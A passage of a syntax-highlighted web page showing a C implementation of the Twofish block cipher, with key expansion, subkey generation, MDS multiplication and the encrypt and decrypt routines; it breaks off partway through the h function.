cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"twofish.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tables.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xor(g,r)    (g^r)                   <span class="comment">/* Xor operation */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ror(g,n)    ((g&gt;&gt;n)|(g&lt;&lt;(32-n)))    <span class="comment">/* Rotate right  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rol(g,n)    ((g<span class="meta-string">&lt;&lt;n)|(g&gt;&gt;(32-n)))    /* Rotate left   */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nxt(g,r)    (*(g+r))                <span class="comment">/* Get next byte */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unpack(g,r) ((g&gt;&gt;(r*8))&amp;0xff)                               <span class="comment">/* Extracts a byte from a word.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pack(g)     ((*(g))|(*(g+1)&lt;&lt;8)|(*(g+2)&lt;&lt;16)|(*(g+3)&lt;&lt;24))  <span class="comment">/* Converts four byte to a word. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> u(x,a)\</span></span><br><span class="line">        x[<span class="number">0</span>] = unpack(a,<span class="number">0</span>); \</span><br><span class="line">        x[<span class="number">1</span>] = unpack(a,<span class="number">1</span>); \</span><br><span class="line">        x[<span class="number">2</span>] = unpack(a,<span class="number">2</span>); \</span><br><span class="line">        x[<span class="number">3</span>] = unpack(a,<span class="number">3</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> release(a,b,c)  &#123; free(a); free(b);free(c); &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">key_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> *k;</span><br><span class="line">&#125;<span class="keyword">key_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">subkey_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> me[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> mo[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">&#125;<span class="keyword">subkey_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Expand Key Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">key_t</span>* expand_key(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Galois Field Multiplication Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @param   y</span></span><br><span class="line"><span class="comment"> * @param   m</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> gf(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Generate Subkeys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_key</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">subkey_t</span>* Twofish_generate_subkey(<span class="keyword">key_t</span>* tf_key);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish h Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x[]</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   stage</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> y[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   out[]</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended K Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   p</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_k_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended S Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_s_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish f Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   r</span></span><br><span class="line"><span class="comment"> * @param   r0, r1</span></span><br><span class="line"><span class="comment"> * @param   f0, f1</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish g Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span> Twofish_g(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_setup(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Expand the key if necessary. */</span></span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = expand_key(s, len/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generate subkeys: s and k */</span></span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = Twofish_generate_subkey(tf_key);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/* Generate 40 K keys */</span></span><br><span class="line">    <span class="keyword">twofish_t</span>* tf_twofish = (<span class="keyword">twofish_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">twofish_t</span>));</span><br><span class="line">    tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,<span class="number">0x01010101</span>,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line">    <span class="comment">/* Generate 4x256 S keys */</span></span><br><span class="line">    tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free memory */</span></span><br><span class="line">    release(tf_key-&gt;k, tf_key, tf_subkey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^pack(data);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^pack(data+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^pack(data+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^pack(data+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = ror((f0^r2), <span class="number">1</span>);</span><br><span class="line">        c3 = (f1^rol(r3,<span class="number">1</span>));</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^c3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cypher[i]   = unpack(r0,i);</span><br><span class="line">        cypher[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        cypher[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        cypher[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> t0, t1, o;</span><br><span class="line">    t0 = Twofish_g(tf_twofish, r0);</span><br><span class="line">    t1 = rol(r1, <span class="number">8</span>);</span><br><span class="line">    t1 = Twofish_g(tf_twofish, t1);</span><br><span class="line">    o = <span class="number">2</span>*r;</span><br><span class="line">    *f0= (t0 + t1 + tf_twofish-&gt;k[o+<span class="number">8</span>]);</span><br><span class="line">    *f1= (t0 + (<span class="number">2</span>*t1) + tf_twofish-&gt;k[o+<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_k_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a, b;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>], z[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">40</span>;i+=<span class="number">2</span>)                  <span class="comment">/* i = 40/2 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        a = (i*p);                          <span class="comment">/* 2*i*p */</span></span><br><span class="line">        b = (a+p);                          <span class="comment">/* ((2*i +1)*p */</span></span><br><span class="line">        u(x,a);</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;me, k);</span><br><span class="line">        Twofish_mds_mul(y,z);</span><br><span class="line">        a = pack(z);                        <span class="comment">/* Convert four bytes z[4] to a word (a). */</span></span><br><span class="line">        u(x,b);                             <span class="comment">/* Convert a word (b) to four bytes x[4]. */</span></span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;mo, k);</span><br><span class="line">        Twofish_mds_mul(y,z);        </span><br><span class="line">        b = pack(z);</span><br><span class="line">        b = rol(b,<span class="number">8</span>);</span><br><span class="line">        tf_twofish-&gt;k[i] = ((a + b));</span><br><span class="line">        tf_twofish-&gt;k[i+<span class="number">1</span>] = rol(((a + (<span class="number">2</span>*b))),<span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_s_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        x[<span class="number">0</span>] = x[<span class="number">1</span>] = x[<span class="number">2</span>] = x[<span class="number">3</span>] = i;</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;s, k);</span><br><span class="line">        <span class="comment">/* Special MDS multiplication */</span></span><br><span class="line">        tf_twofish-&gt;s[<span class="number">0</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">0</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">1</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">1</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">2</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">2</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">3</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">3</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* MDS multiplication */</span></span><br><span class="line">    out[<span class="number">0</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">0</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">1</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">1</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">2</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">2</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">3</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">3</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Twofish_g(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (tf_twofish-&gt;s[<span class="number">0</span>][unpack(x,<span class="number">0</span>)]^tf_twofish-&gt;s[<span class="number">1</span>][unpack(x, <span class="number">1</span>)]^tf_twofish-&gt;s[<span class="number">2</span>][unpack(x,<span class="number">2</span>)]^tf_twofish-&gt;s[<span class="number">3</span>][unpack(x,<span class="number">3</span>)]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> out[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">4</span>;++j)</span><br><span class="line">    &#123;</span><br><span class="line">        y[j] = x[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">3</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">0</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">3</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">3</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">3</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stage &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">0</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">2</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out[<span class="number">0</span>] = q[<span class="number">1</span>][q[<span class="number">0</span>][ q[<span class="number">0</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">1</span>][<span class="number">0</span>])] ^ (s[<span class="number">0</span>][<span class="number">0</span>])];</span><br><span class="line">    out[<span class="number">1</span>] = q[<span class="number">0</span>][q[<span class="number">0</span>][ q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">1</span>][<span class="number">1</span>])] ^ 